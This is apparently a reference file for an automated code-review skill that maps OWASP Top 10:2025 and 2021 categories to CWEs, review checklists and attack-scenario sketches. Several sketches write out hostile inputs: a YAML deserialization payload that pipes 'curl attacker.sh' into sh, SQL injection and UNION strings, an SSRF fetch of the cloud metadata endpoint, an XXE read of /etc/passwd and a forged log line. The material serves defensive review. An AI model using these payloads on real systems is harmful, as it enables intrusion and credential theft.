# OWASP Top 10 for Web Applications — Review Reference

This reference covers both editions the skill must check:

- **[OWASP Top 10:2025](https://top10.owasp.org/2025/)** — the primary lens. Checklists below are organized by its categories.
- **[OWASP Top 10:2021](https://owasp.org/Top10/2021/)** — retained for mapping continuity. Many organizations track findings against the 2021 edition; report the 2025 category as primary and add the 2021 equivalent when it differs.

For each category: what to check, the notable CWEs OWASP maps to it, and attack-scenario sketches to prime scenario construction. The full official CWE lists live on each category page on the OWASP site — cite additional CWEs only after checking there or `https://cwe.mitre.org/data/definitions/<ID>.html`.

## Edition Correspondence (2021 ↔ 2025)

| 2025 | 2021 | Change |
|---|---|---|
| A01 Broken Access Control | A01 Broken Access Control | Same; 2025 folds SSRF (CWE-918) in here |
| A02 Security Misconfiguration | A05 Security Misconfiguration | Moved up to #2 |
| A03 Software Supply Chain Failures | A06 Vulnerable and Outdated Components | Broadened beyond known-vulnerable components |
| A04 Cryptographic Failures | A02 Cryptographic Failures | Same focus |
| A05 Injection | A03 Injection | Same focus |
| A06 Insecure Design | A04 Insecure Design | Same focus |
| A07 Authentication Failures | A07 Identification and Authentication Failures | Renamed |
| A08 Software or Data Integrity Failures | A08 Software and Data Integrity Failures | Renamed, focused on trust boundaries |
| A09 Security Logging and Alerting Failures | A09 Security Logging and Monitoring Failures | Alerting emphasized |
| A10 Mishandling of Exceptional Conditions | *(new in 2025)* | Error handling, failing open, logical errors |
| *(folded into A01/A03 in 2025)* | A10 Server-Side Request Forgery (SSRF) | Report SSRF as CWE-918 under A01:2025 |

---

## A01:2025 — Broken Access Control

Failures let users act outside their intended permissions: unauthorized disclosure, modification, or performing business functions beyond their limits.

**Notable CWEs (from the 40 mapped):** CWE-22 (Path Traversal), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-201, CWE-284 (Improper Access Control), CWE-285 (Improper Authorization), CWE-352 (CSRF), CWE-359, CWE-425 (Forced Browsing), CWE-552, CWE-639 (Authorization Bypass Through User-Controlled Key — IDOR), CWE-668 (Exposure of Resource to Wrong Sphere), CWE-862 (Missing Authorization), CWE-863 (Incorrect Authorization), CWE-918 (SSRF), CWE-1275 (Sensitive Cookie with Improper SameSite Attribute).

**Checklist:**

- [ ] Every protected operation performs an authorization check server-side (deny by default; the UI hiding a button is not a control).
- [ ] Record ownership enforced — can user A act on user B's resource by changing an identifier (IDOR, CWE-639)?
- [ ] Object references validated against the authenticated principal, not just format-checked.
- [ ] File paths constructed from user input are validated and confined (path traversal, CWE-22/23/36).
- [ ] Privilege escalation: can a logged-in user reach admin functions (force browsing, CWE-425; parameter tampering; JWT/cookie metadata manipulation)?
- [ ] CORS configuration allows only trusted origins — no wildcard with credentials.
- [ ] Rate limits on authentication and sensitive endpoints.
- [ ] Sessions invalidated on logout; JWTs short-lived with refresh-token revocation.
- [ ] Mass assignment: can request fields set attributes the user must not control (roles, flags, prices)?
- [ ] SSRF (CWE-918): server-side fetch of user-supplied or user-influenced URLs; check scheme/host allowlists, private-IP blocking, redirect handling.

**Scenario sketches:**

- *IDOR*: `GET /api/invoices/{id}` returns any invoice because the handler never compares `invoice.OwnerID` to the caller's identity → attacker enumerates ids and reads other tenants' invoices (CWE-639, VC:H).
- *Force browsing*: frontend-only protection — `curl https://app/admin_getappInfo` works unauthenticated because the route has no middleware (CWE-425/862, PR:N).
- *SSRF*: webhook URL preview feature fetches `http://169.254.169.254/latest/meta-data/` → cloud metadata credential theft (CWE-918, SC:H for the subsequent system).

## A02:2025 — Security Misconfiguration

Systems, applications, or cloud services set up insecurely.

**Notable CWEs (16 mapped):** CWE-16 (Configuration), CWE-611 (XXE).

**Checklist:**

- [ ] No default accounts/passwords; no unnecessary features, ports, services, pages enabled.
- [ ] Security headers set to secure values: CSP, HSTS, X-Content-Type-Options, X-Frame-Options.
- [ ] Debug modes, verbose errors, stack traces disabled in production configuration.
- [ ] Cloud storage / DB / internal services not publicly exposed; directory listing disabled; `.git`, backups, and metadata not under the web root.
- [ ] XML parsers disable external entities and DTDs (XXE, CWE-611) — check every parser, including in dependencies.
- [ ] Secrets absent from config files committed to the repo (pairs with A04/CWE-798).

**Scenario sketch:** an XML import endpoint uses a default-configured parser; a crafted `<!DOCTYPE` with an external entity reads `/etc/passwd` or an internal service URL and reflects it in the error body (CWE-611).

## A03:2025 — Software Supply Chain Failures

Breakdowns or compromises in building, distributing, or updating software — vulnerable or malicious third-party code, tools, and dependencies.

**Notable CWEs (6 mapped):** CWE-477 (Use of Obsolete Function), CWE-1104 (Use of Unmaintained Third Party Components), CWE-1329 (Reliance on Component That is Not Updateable), CWE-1395 (Dependency on Vulnerable Third-Party Component).

**Checklist:**

- [ ] Dependencies pinned; lockfiles present and committed (`go.sum`, `package-lock.json`, `Cargo.lock`, `poetry.lock`, etc.).
- [ ] Vulnerability scanning runs (see [tooling](tooling.md)); known-CVE dependencies reachable from the reviewed code are findings, not just noise.
- [ ] Components come from trusted registries; integrity verified (checksums, signatures, provenance) — beware `curl | bash` in Dockerfiles and CI.
- [ ] CI/CD pipelines hardened: pinned runner images, least-privilege tokens, protected branches, no secrets in workflow files.
- [ ] Transitive dependencies accounted for, not just direct ones.

**Scenario sketch:** `package-lock.json` pins a transitive dependency with CVE-2024-XXXX (RCE); the vulnerable function is imported by a code path handling uploads → attacker crafts the malicious payload, achieving code execution in the container (CWE-1395, cite the CVE and the reachability evidence).

## A04:2025 — Cryptographic Failures

Missing, weak, or misused cryptography; key-management failures; sensitive-data exposure.

**Notable CWEs (32 mapped):** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-331 (Insufficient Entropy), CWE-1241 (Use of Predictable Algorithm in Random Number Generator), CWE-338 (Use of Cryptographically Weak PRNG).

**Checklist:**

- [ ] Sensitive data encrypted in transit (TLS 1.2+) and at rest; no plaintext storage of passwords, tokens, PII where encryption is warranted by the threat model.
- [ ] No broken algorithms/protocols: MD5, SHA1 for security purposes, DES, RC4, ECB mode; no passwords used as keys without a KDF (argon2/bcrypt/scrypt/PBKDF2).
- [ ] No hardcoded keys (pairs with CWE-798/A07); keys rotated and stored in a vault, not in env-committed files.
- [ ] Randomness for security purposes comes from a CSPRNG — not `math/rand`, `Math.random()`, `random.random()` (CWE-338), session tokens and reset links included (CWE-331/1241).
- [ ] IVs unique per encryption; authenticated encryption (AES-GCM, ChaCha20-Poly1305) preferred; no padding-oracle-prone error distinctions.
- [ ] Certificate and trust-chain validation on outbound TLS connections (no `InsecureSkipVerify`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `verify=False`).

**Scenario sketch:** password-reset tokens generated with `math/rand` seeded by time; attacker knows the seed range from the timestamp of their own request, brute-forces the token for a victim's session, takes over the account (CWE-338 + CWE-331, PR:N, UI:N, VC:H/VI:H).

## A05:2025 — Injection

Untrusted input sent to an interpreter (database, shell, browser, template engine) and executed as commands or queries.

**Notable CWEs (37 mapped):** CWE-20 (Improper Input Validation), CWE-74 (Injection), CWE-77 (Command Injection), CWE-78 (OS Command Injection), CWE-79 (XSS), CWE-89 (SQL Injection), CWE-90 (LDAP Injection), CWE-91 (XPath Injection), CWE-94 (Code Injection), CWE-95 (Eval Injection), CWE-917 (Expression Language Injection), CWE-564 (Hibernate injection), CWE-643 (XPath injection).

**Checklist:**

- [ ] All database access uses parameterized queries / prepared statements / safe ORM binding — no string concatenation or `fmt.Sprintf` into SQL; watch dynamic ORDER BY / LIMIT / table and column names (identifiers can't be parameterized — allowlist them).
- [ ] No shell construction from user input (`exec.Command("sh", "-c", userString)`); prefer argv-style APIs; if unavoidable, strict allowlists and no metacharacters (CWE-78).
- [ ] Output encoding context-appropriate for XSS (CWE-79): HTML body, attribute, JS, URL contexts differ; template engines on auto-escape; `dangerouslySetInnerHTML`/`template.HTML` justified.
- [ ] Template engines not evaluating user input as expressions (CWE-94/917).
- [ ] ORM filter operators taken from user input without an allowlist (e.g., accepting `{"age.$gt": 0}` or operator injection in query params).
- [ ] LDAP/XPath/NoSQL/Header (CRLF, CWE-93/113) injection surfaces reviewed.

**Scenario sketch:** `db.Raw("SELECT * FROM users WHERE name = '" + name + "'")` on a search endpoint; `name = "' OR 1=1 --"` dumps the user table, `' UNION SELECT …` exfiltrates password hashes (CWE-89; AV:N, PR:N, UI:N).

## A06:2025 — Insecure Design

Missing or ineffective control *design* — risks that exist before any implementation defect; includes business-logic design flaws.

**Notable CWEs (39 mapped):** CWE-256 (Unprotected Storage of Credentials), CWE-269 (Improper Privilege Management), CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-501 (Trust Boundary Violation), CWE-522 (Insufficiently Protected Credentials).

**Checklist:**

- [ ] Security requirements exist (SECURITY.md/threat model); the change is consistent with them.
- [ ] Validation at the trust boundary, not deep inside; deny-by-default for new capabilities.
- [ ] Resource limits: request size, upload size, pagination bounds, query complexity (also a DoS control).
- [ ] Uploads: type/extension validated server-side, stored outside the web root or on object storage, served with safe content types (CWE-434).
- [ ] Trust boundaries explicit — no security decision made on data that crossed a boundary without revalidation (CWE-501).
- [ ] Business-logic design flaws (missing unwanted-state definitions) — see the dedicated [business logic reference](business-logic-and-races.md).

**Scenario sketch:** an avatar upload accepts any extension and serves uploads from the same origin; attacker uploads `shell.php` or an HTML file with JS (stored XSS / RCE depending on server) → account takeover of viewers (CWE-434).

## A07:2025 — Authentication Failures

The system accepts invalid or incorrect identities as legitimate.

**Notable CWEs (36 mapped):** CWE-259 (Use of Hard-coded Password), CWE-297 (Improper Validation of Certificate with Host Mismatch), CWE-287 (Improper Authentication), CWE-384 (Session Fixation), CWE-798 (Use of Hard-coded Credentials).

**Checklist:**

- [ ] Authentication via vetted frameworks; no hand-rolled crypto or token schemes.
- [ ] Password policy: length minimum, breached-password checks; no plaintext or weak-hash storage (bcrypt/argon2).
- [ ] No hardcoded credentials/API keys in code or config (CWE-798/259) — run a secret scanner.
- [ ] Session/token lifecycle: generated by CSPRNG, rotated on login (CWE-384), invalidated on logout and password change, absolute timeouts.
- [ ] MFA for sensitive operations; credential-recovery flows resist user enumeration (uniform responses and timings).
- [ ] Brute-force protections: rate limiting, lockout, backoff — on login, reset, MFA verification alike.
- [ ] Outbound TLS hostname verification enabled (CWE-297).

**Scenario sketch:** login returns "user not found" vs "wrong password"; attacker enumerates valid usernames via response differences, then targeted phishing/password stuffing (CWE-204-class behavior under CWE-287; PR:N, UI:P for the stuffing phase).

## A08:2025 — Software or Data Integrity Failures

Assumptions of integrity without verification: untrusted code/data treated as trusted, insecure deserialization, unsigned updates.

**Notable CWEs (14 mapped):** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere), CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-502 (Deserialization of Untrusted Data).

**Checklist:**

- [ ] No deserialization of untrusted data with native format serializers (`pickle`, `yaml.load` without SafeLoader, Java native serialization, `gob` from untrusted sources); use data formats with strict schemas (CWE-502).
- [ ] Plugins/libraries fetched from CDNs or registries are integrity-verified (SRI hashes, signatures) — not just fetched.
- [ ] Auto-update mechanisms verify signatures before applying (CWE-494-class under this category).
- [ ] CI/CD consumes artifacts from untrusted places only after verification (pairs with A03).
- [ ] Mass assignment / object-attribute control: request binding can't set server-side attributes (CWE-915) — allowlist bindable fields.

**Scenario sketch:** a job queue accepts JSON but the consumer also supports `yaml.Unmarshal` on the payload; attacker posts `!!python/object/apply:os.system ["curl attacker.sh|sh"]` → RCE on the worker (CWE-502, VI:H/VA:H on the vulnerable system).

## A09:2025 — Security Logging and Alerting Failures

Attacks cannot be detected or acted upon without adequate logging, monitoring, and alerting.

**Notable CWEs (5 mapped):** CWE-117 (Improper Output Neutralization for Logs), CWE-532 (Insertion of Sensitive Information into Log File), CWE-778 (Insufficient Logging).

**Checklist:**

- [ ] Authentication events, access-control denials, and input-validation failures are logged with sufficient context (actor, action, object, outcome, request id).
- [ ] Logs are free of secrets and sensitive data: no passwords, tokens, session ids, full card numbers/PII (CWE-532).
- [ ] Log injection neutralized: user input written to logs is escaped/encoded so attackers can't forge log entries or break SIEM parsing (CWE-117).
- [ ] Alerting thresholds exist for suspicious patterns (repeated failures, privilege changes, unusual volumes) — logging without alerting is half a control.
- [ ] Log timestamps consistent (UTC/ISO 8601) and integrity-protected where the threat model requires.

**Scenario sketch:** the login handler logs `username` verbatim; attacker submits username `alice\n2026-01-01 admin login ok` — the forged line contaminates the audit trail during a later forensic investigation (CWE-117; typically Low/Medium severity, VI:L).

## A10:2025 — Mishandling of Exceptional Conditions

Improper error handling, logical errors, and failing open under abnormal conditions. New in 2025.

**Notable CWEs (24 mapped):** CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-234 (Failure to Handle Missing Parameter), CWE-274 (Improper Handling of Insufficient Privileges), CWE-476 (NULL Pointer Dereference), CWE-636 (Not Failing Securely — 'Failing Open').

**Checklist:**

- [ ] Error paths fail closed: a failed authorization check, unavailable policy service, or exception in a security filter must *deny*, not permit (CWE-636).
- [ ] Exceptions from security-relevant code are not swallowed silently — caught-and-continue around authz/authn is a finding.
- [ ] Error responses to clients are generic; stack traces, SQL errors, internal paths stay in server logs (CWE-209).
- [ ] Missing/invalid parameters and headers handled explicitly, not by falling through to defaults (CWE-234).
- [ ] Partial failure semantics defined for multi-step operations (rollback/compensation), including on timeout.
- [ ] Resource cleanup in all paths; NULL/nil dereferences on hostile input (CWE-476) — a crash on attacker input is at minimum a DoS (VA).

**Scenario sketch:** the license/entitlement check throws on a malformed header; the catch block logs and `return nil` (no error = allowed) → attacker sends a corrupt entitlement header and bypasses the paywall (CWE-636; PR:N, VI:H on business rules).

---

## 2021-Only Categories

Two 2021 categories have no same-numbered successor; findings still map to them when reporting against the 2021 edition:

- **A06:2021 Vulnerable and Outdated Components** → in 2025 report under A03 Software Supply Chain Failures. Primary CWE-1104; also CWE-1395. The review checks are the A03 checklist.
- **A10:2021 Server-Side Request Forgery (SSRF)** → in 2025 report as CWE-918 under A01 Broken Access Control. The review checks are in the A01 checklist (user-influenced outbound fetches, allowlists, redirect handling, private-IP and metadata-endpoint blocking).

## 2021 Categories with Renumbered 2025 Equivalents

When reporting against 2021, translate the 2025 finding using the correspondence table at the top of this file — e.g., a 2025 A02 (misconfiguration) finding is A05:2021; a 2025 A04 (crypto) finding is A02:2021; a 2025 A07 finding is A07:2021 under its older name "Identification and Authentication Failures". Checklists are identical to their 2025 counterparts; only the identifiers change.
